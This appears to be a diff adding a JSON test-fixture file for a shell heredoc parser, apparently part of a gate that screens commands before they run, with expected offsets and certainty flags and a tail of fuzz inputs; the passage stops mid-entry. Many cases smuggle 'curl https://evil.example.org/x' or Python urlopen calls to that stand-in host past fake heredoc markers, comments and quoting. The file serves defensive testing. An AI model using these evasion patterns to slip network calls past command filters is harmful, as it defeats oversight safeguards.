@@ -1,0 +1,2821 @@
+[
+ {
+  "cmd": "cat > /dev/null <<E\\OF\njunk\nEOF\ncurl https://evil.example.org/x",
+  "heredocs": [
+   {
+    "start": 16,
+    "tailStart": 22,
+    "lineEnd": 22,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 23,
+    "bodyEnd": 28,
+    "end": 31,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat > /dev/null <<E\"O\"F\njunk\nEOF\ncurl https://evil.example.org/x",
+  "heredocs": [
+   {
+    "start": 16,
+    "tailStart": 23,
+    "lineEnd": 23,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 24,
+    "bodyEnd": 29,
+    "end": 32,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "echo \"<<EOF\" >/dev/null\ncurl https://evil.example.org/x\nEOF",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "echo '<<EOF' >/dev/null\ncurl https://evil.example.org/x\nEOF",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "# see <<EOF\ncurl https://evil.example.org/x\nEOF",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "ls >/dev/null # <<EOF\ncurl https://evil.example.org/x\nEOF",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "x=$((y<<z))\ncurl https://evil.example.org/x\nz",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "(( y<<z ))\ncurl https://evil.example.org/x\nz",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "a[y<<z]=1\ncurl https://evil.example.org/x\nz",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "python3 - <<'END-X'\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nEND-X",
+  "heredocs": [
+   {
+    "start": 10,
+    "tailStart": 19,
+    "lineEnd": 19,
+    "tag": "END-X",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 20,
+    "bodyEnd": 95,
+    "end": 100,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "python3 - <<END-X\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nEND-X",
+  "heredocs": [
+   {
+    "start": 10,
+    "tailStart": 17,
+    "lineEnd": 17,
+    "tag": "END-X",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 18,
+    "bodyEnd": 93,
+    "end": 98,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "python3 - <<\\EOF\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nEOF",
+  "heredocs": [
+   {
+    "start": 10,
+    "tailStart": 16,
+    "lineEnd": 16,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 17,
+    "bodyEnd": 92,
+    "end": 95,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "python3 - <<E\\OF\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nEOF",
+  "heredocs": [
+   {
+    "start": 10,
+    "tailStart": 16,
+    "lineEnd": 16,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 17,
+    "bodyEnd": 92,
+    "end": 95,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "python3 - <<'E'\"O\"F\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nEOF",
+  "heredocs": [
+   {
+    "start": 10,
+    "tailStart": 19,
+    "lineEnd": 19,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 20,
+    "bodyEnd": 95,
+    "end": 98,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "python3 - << 'PY'\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nPY",
+  "heredocs": [
+   {
+    "start": 10,
+    "tailStart": 17,
+    "lineEnd": 17,
+    "tag": "PY",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 18,
+    "bodyEnd": 93,
+    "end": 95,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "python3 -<<PY\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nPY",
+  "heredocs": [
+   {
+    "start": 9,
+    "tailStart": 13,
+    "lineEnd": 13,
+    "tag": "PY",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 14,
+    "bodyEnd": 89,
+    "end": 91,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "python3 <<'PY'\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nPY",
+  "heredocs": [
+   {
+    "start": 8,
+    "tailStart": 14,
+    "lineEnd": 14,
+    "tag": "PY",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 15,
+    "bodyEnd": 90,
+    "end": 92,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "bash <<'END-X'\ncurl https://evil.example.org/x\nEND-X",
+  "heredocs": [
+   {
+    "start": 5,
+    "tailStart": 14,
+    "lineEnd": 14,
+    "tag": "END-X",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 15,
+    "bodyEnd": 47,
+    "end": 52,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "bash <<\\EOF\ncurl https://evil.example.org/x\nEOF",
+  "heredocs": [
+   {
+    "start": 5,
+    "tailStart": 11,
+    "lineEnd": 11,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 12,
+    "bodyEnd": 44,
+    "end": 47,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "bash <<-'A.B'\n\tcurl https://evil.example.org/x\n\tA.B",
+  "heredocs": [
+   {
+    "start": 5,
+    "tailStart": 13,
+    "lineEnd": 13,
+    "tag": "A.B",
+    "quoted": true,
+    "dash": true,
+    "bodyStart": 14,
+    "bodyEnd": 47,
+    "end": 51,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "python3 - <<A <<'B-1'\nx\nA\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nB-1",
+  "heredocs": [
+   {
+    "start": 10,
+    "tailStart": 13,
+    "lineEnd": 21,
+    "tag": "A",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 22,
+    "bodyEnd": 24,
+    "end": 25,
+    "closed": true
+   },
+   {
+    "start": 14,
+    "tailStart": 21,
+    "lineEnd": 21,
+    "tag": "B-1",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 26,
+    "bodyEnd": 101,
+    "end": 104,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat > /dev/null <<'D'\nhello\nD\npython3 - <<'P-Y'\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nP-Y",
+  "heredocs": [
+   {
+    "start": 16,
+    "tailStart": 21,
+    "lineEnd": 21,
+    "tag": "D",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 22,
+    "bodyEnd": 28,
+    "end": 29,
+    "closed": true
+   },
+   {
+    "start": 40,
+    "tailStart": 47,
+    "lineEnd": 47,
+    "tag": "P-Y",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 48,
+    "bodyEnd": 123,
+    "end": 126,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat <<'A' > /dev/null; python3 - <<'B-B'\nadat\nA\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nB-B",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 9,
+    "lineEnd": 40,
+    "tag": "A",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 41,
+    "bodyEnd": 46,
+    "end": 47,
+    "closed": true
+   },
+   {
+    "start": 33,
+    "tailStart": 40,
+    "lineEnd": 40,
+    "tag": "B-B",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 48,
+    "bodyEnd": 123,
+    "end": 126,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "x=$(bash <<'Q-Q'\ncurl https://evil.example.org/x\nQ-Q\n)",
+  "heredocs": [
+   {
+    "start": 9,
+    "tailStart": 16,
+    "lineEnd": 16,
+    "tag": "Q-Q",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 17,
+    "bodyEnd": 49,
+    "end": 52,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "x=$(cat <<EOF\nhi\nEOF)\ncurl https://evil.example.org/x",
+  "heredocs": [
+   {
+    "start": 8,
+    "tailStart": 13,
+    "lineEnd": 13,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 14,
+    "bodyEnd": 53,
+    "end": 53,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "cat > /dev/null <<'EOF'\njunk\nEOF \ncurl https://evil.example.org/x\nEOF",
+  "heredocs": [
+   {
+    "start": 16,
+    "tailStart": 23,
+    "lineEnd": 23,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 24,
+    "bodyEnd": 66,
+    "end": 69,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat > /dev/null <<'EOF'\ncurl https://evil.example.org/x\nEOF",
+  "heredocs": [
+   {
+    "start": 16,
+    "tailStart": 23,
+    "lineEnd": 23,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 24,
+    "bodyEnd": 56,
+    "end": 59,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat > /dev/null <<'END-X'\ncurl https://evil.example.org/x\nEND-X",
+  "heredocs": [
+   {
+    "start": 16,
+    "tailStart": 25,
+    "lineEnd": 25,
+    "tag": "END-X",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 26,
+    "bodyEnd": 58,
+    "end": 63,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat > /dev/null <<\\EOF\ncurl https://evil.example.org/x\nEOF",
+  "heredocs": [
+   {
+    "start": 16,
+    "tailStart": 22,
+    "lineEnd": 22,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 23,
+    "bodyEnd": 55,
+    "end": 58,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat > /dev/null <<E\\OF\ncurl https://evil.example.org/x\nEOF",
+  "heredocs": [
+   {
+    "start": 16,
+    "tailStart": 22,
+    "lineEnd": 22,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 23,
+    "bodyEnd": 55,
+    "end": 58,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "git hash-object --stdin <<'EOF' >/dev/null\nblock curl https://evil.example.org/x in gate\nEOF",
+  "heredocs": [
+   {
+    "start": 24,
+    "tailStart": 31,
+    "lineEnd": 42,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 43,
+    "bodyEnd": 89,
+    "end": 92,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "echo \"a<<b\" >/dev/null; curl -s -m1 http://localhost:9/x >/dev/null; true",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "python3 - <<'PY'\nprint('https://evil.example.org/x')\nPY",
+  "heredocs": [
+   {
+    "start": 10,
+    "tailStart": 16,
+    "lineEnd": 16,
+    "tag": "PY",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 17,
+    "bodyEnd": 53,
+    "end": 55,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "bash /dev/null - <<'M-1'\nthe gate missed curl https://evil.example.org/x\nM-1",
+  "heredocs": [
+   {
+    "start": 17,
+    "tailStart": 24,
+    "lineEnd": 24,
+    "tag": "M-1",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 25,
+    "bodyEnd": 73,
+    "end": 76,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat > /dev/null <<'A'\ncurl https://evil.example.org/x\nA\ncat > /dev/null <<'B-2'\ncurl https://evil.example.org/x\nB-2",
+  "heredocs": [
+   {
+    "start": 16,
+    "tailStart": 21,
+    "lineEnd": 21,
+    "tag": "A",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 22,
+    "bodyEnd": 54,
+    "end": 55,
+    "closed": true
+   },
+   {
+    "start": 72,
+    "tailStart": 79,
+    "lineEnd": 79,
+    "tag": "B-2",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 80,
+    "bodyEnd": 112,
+    "end": 115,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "echo $((1<<2)) >/dev/null; curl -s -m1 http://localhost:9/x >/dev/null; true",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "cat >/dev/null <<'A' <<'B'\na\ncurl https://evil.example.org/x\nA\nb\ncurl https://evil.example.org/x\nB",
+  "heredocs": [
+   {
+    "start": 15,
+    "tailStart": 20,
+    "lineEnd": 26,
+    "tag": "A",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 27,
+    "bodyEnd": 61,
+    "end": 62,
+    "closed": true
+   },
+   {
+    "start": 21,
+    "tailStart": 26,
+    "lineEnd": 26,
+    "tag": "B",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 63,
+    "bodyEnd": 97,
+    "end": 98,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "echo \"<<EOF\"\ntouch /tmp/x\nEOF",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "echo '<<EOF'\ntouch /tmp/x\nEOF",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "# <<EOF\ntouch /tmp/x\nEOF",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "<<'X' python3\nopen('/tmp/x', 'w').close()\nX",
+  "heredocs": [
+   {
+    "start": 0,
+    "tailStart": 5,
+    "lineEnd": 13,
+    "tag": "X",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 14,
+    "bodyEnd": 42,
+    "end": 43,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat <<'X' | python3\nopen('/tmp/x', 'w').close()\nX",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 9,
+    "lineEnd": 19,
+    "tag": "X",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 20,
+    "bodyEnd": 48,
+    "end": 49,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "python3 \\\n - <<'E'\nopen('/tmp/x', 'w').close()\nE",
+  "heredocs": [
+   {
+    "start": 13,
+    "tailStart": 18,
+    "lineEnd": 18,
+    "tag": "E",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 19,
+    "bodyEnd": 47,
+    "end": 48,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat > /dev/null <<EOF\n$(touch /tmp/x)\nEOF",
+  "heredocs": [
+   {
+    "start": 16,
+    "tailStart": 21,
+    "lineEnd": 21,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 22,
+    "bodyEnd": 38,
+    "end": 41,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "x=$(cat <<EOF\nhi\nEOF)\ntouch /tmp/x\n",
+  "heredocs": [
+   {
+    "start": 8,
+    "tailStart": 13,
+    "lineEnd": 13,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 14,
+    "bodyEnd": 35,
+    "end": 35,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "a[1<<EOF]=x\ntouch /tmp/x\nEOF",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "echo $((1<<2)) >/dev/null\ntouch /tmp/x\n",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "cat >/dev/null <<'A' <<'B'\na\ntouch /tmp/x\nA\nb\ntouch /tmp/x\nB",
+  "heredocs": [
+   {
+    "start": 15,
+    "tailStart": 20,
+    "lineEnd": 26,
+    "tag": "A",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 27,
+    "bodyEnd": 42,
+    "end": 43,
+    "closed": true
+   },
+   {
+    "start": 21,
+    "tailStart": 26,
+    "lineEnd": 26,
+    "tag": "B",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 44,
+    "bodyEnd": 59,
+    "end": 60,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat <<< 'x' >/dev/null\nls",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "a=( <<EOF )\nls\nEOF",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "echo ${x:-<<EOF}\nls\nEOF",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "case $x in a) cat <<EOF ;; esac\nhi\nEOF",
+  "heredocs": [
+   {
+    "start": 18,
+    "tailStart": 23,
+    "lineEnd": 31,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 32,
+    "bodyEnd": 35,
+    "end": 38,
+    "closed": true
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "cat <<\"E$X\"\nhi\nE$X",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "cat <<E\\\nOF\nhi\nE",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "cat <<-EOF\n\thi\n\tEOF\nls",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 10,
+    "lineEnd": 10,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": true,
+    "bodyStart": 11,
+    "bodyEnd": 15,
+    "end": 19,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "echo `cat <<EOF`\nhi\nEOF",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "(( a <<= 2 ))\nls",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "cat <<-EOF\n  hi\n  EOF\nls\nEOF",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 10,
+    "lineEnd": 10,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": true,
+    "bodyStart": 11,
+    "bodyEnd": 25,
+    "end": 28,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat <<EOF\nhi\n EOF\nEOF",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 9,
+    "lineEnd": 9,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 10,
+    "bodyEnd": 18,
+    "end": 21,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat <<-EOF\n\t \tEOF\nEOF",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 10,
+    "lineEnd": 10,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": true,
+    "bodyStart": 11,
+    "bodyEnd": 18,
+    "end": 21,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat <<EOF\nhi\nEOF\t\nEOF",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 9,
+    "lineEnd": 9,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 10,
+    "bodyEnd": 18,
+    "end": 21,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat <<'A B'\nx\nA B",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 11,
+    "lineEnd": 11,
+    "tag": "A B",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 12,
+    "bodyEnd": 14,
+    "end": 17,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat << \tEOF\nx\nEOF",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 11,
+    "lineEnd": 11,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 12,
+    "bodyEnd": 14,
+    "end": 17,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat <<-\\EOF\n\tx\n\tEOF",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 11,
+    "lineEnd": 11,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": true,
+    "bodyStart": 12,
+    "bodyEnd": 15,
+    "end": 19,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "ls #<<E\nx\nE",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "ls\t#<<E\nx\nE",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "ls;#<<E\nx\nE",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "ls&#<<E\nx\nE",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "ls|#<<E\nx\nE",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "ls<#<<E\nx\nE",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "ls>#<<E\nx\nE",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "lsa#<<E\nx\nE",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 7,
+    "lineEnd": 7,
+    "tag": "E",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 8,
+    "bodyEnd": 10,
+    "end": 11,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "ls(#<<E\nx\nE",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "ls)#<<E\nx\nE",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "ls`#<<E\nx\nE",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "ls x=(<<E)\nx\nE",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "ls x@(<<E)\nx\nE",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "ls x?(<<E)\nx\nE",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "ls x*(<<E)\nx\nE",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "ls x+(<<E)\nx\nE",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "ls x!(<<E)\nx\nE",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "ls xa(<<E)\nx\nE",
+  "heredocs": [
+   {
+    "start": 6,
+    "tailStart": 9,
+    "lineEnd": 10,
+    "tag": "E",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 11,
+    "bodyEnd": 13,
+    "end": 14,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "ls x$(<<E)\nx\nE",
+  "heredocs": [
+   {
+    "start": 6,
+    "tailStart": 9,
+    "lineEnd": 10,
+    "tag": "E",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 11,
+    "bodyEnd": 13,
+    "end": 14,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "cat <<'EOF'\nunclosed",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 11,
+    "lineEnd": 11,
+    "tag": "EOF",
+    "quoted": true,
+    "dash": false,
+    "bodyStart": 12,
+    "bodyEnd": 20,
+    "end": 20,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "cat <<",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "x=$[1<<2]\nls",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "echo \"$(cat <<EOF\nhi\nEOF\n)\"",
+  "heredocs": [
+   {
+    "start": 12,
+    "tailStart": 17,
+    "lineEnd": 17,
+    "tag": "EOF",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 18,
+    "bodyEnd": 21,
+    "end": 24,
+    "closed": true
+   }
+  ],
+  "certain": true
+ },
+ {
+  "cmd": "$'\nEOF\n\n\n\tEOF\n}=($((\\EX)",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\t\\<<\nEOF\n",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": " ",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "\nE\nEOF\n\nEOF\n\nEOF\n`",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "|$(}\\EOF",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$[${<<<cat \\\n\n\tEOF\na= #EOF`((<<$'\nEOF\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "=(<<};`}\\\nEOF\n$($[\\x\"\\${",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n<<$((Ecat ;;(($((}",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<<\tx@(\ta=$['$((",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\"$'<<-XE#}$((&${E))<<-${$())",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\n\tEOF\n$(())<<<\n'))1;)",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$((${}-\n\tEOF\n$[\n($\t&\\<<-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\\\nEOF",
+  "heredocs": [],
+  "certain": true
+ },
+ {
+  "cmd": "\n[$[a=$[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "=(<<-${<<-$()",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\" ))=(((<<<(($((<<<$[}$(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "&&$(<<<'|]1<<-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "${\nEOF\n1\"&<<<`\n\tEOF\n@(\n\t<<-$(($[",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ";x`",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ")$(($()#<<-($((\n\tEOF\n]'\\\n<<$(\n\\",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "-a=<<a=x'$'${#) \"((",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$( X\"\t",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "(1",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "-1\n\nEOF\n\n\tEOF\n\\((\n;",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "`X=(<<-cat #$($(]\\ \n\tEOF\n$'\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": " ; ((\\\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\tEOF))",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$((${[-@(\n@(a=<<-${#)",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$[((\nEOF\n\\X$'\"\t\" ((} `[=(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$(($((1$&&\nEOF\n$'xE\n\tEOF\n",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "cat EOF<<<|XE[$'<<<;-\\\n1x[\\@(",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<<\n<<-x&'\\1-$'$[=(EOF",
+  "heredocs": [
+   {
+    "start": 4,
+    "tailStart": 8,
+    "lineEnd": 22,
+    "tag": "x",
+    "quoted": false,
+    "dash": true,
+    "bodyStart": 22,
+    "bodyEnd": 22,
+    "end": 22,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": "x&;$<<<&X))-=(;[}",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "(@((cat $(#\n[}`a=\t-1#$((",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "1|1cat - @())<<-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<$ @($[\\'<<\"(([\"",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "$'<<EOF",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "'$[=(}'\\\n1\n\tEOF\n '))cat <<<Ex]@(|",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "E) <<=($&\\\n${#$",
+  "heredocs": [
+   {
+    "start": 3,
+    "tailStart": 6,
+    "lineEnd": 15,
+    "tag": "=",
+    "quoted": false,
+    "dash": false,
+    "bodyStart": 15,
+    "bodyEnd": 15,
+    "end": 15,
+    "closed": false
+   }
+  ],
+  "certain": false
+ },
+ {
+  "cmd": ";<<-&x$\t(]#Xx$((()\tX",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<<=(#x-\\\n\t",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": ";\n\tEOF\n[\n`(@(]\n\tEOF\n`}(<<-",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "<<\"\n\tEOF\n=(1 `<<\\\n`\t$'X[))",
+  "heredocs": [],
+  "certain": false
+ },
+ {
+  "cmd": "\\\n${  \\\na=}<<-;$((<<] ",
+  "heredocs": [],
+  "certain": false
+ },
+ {
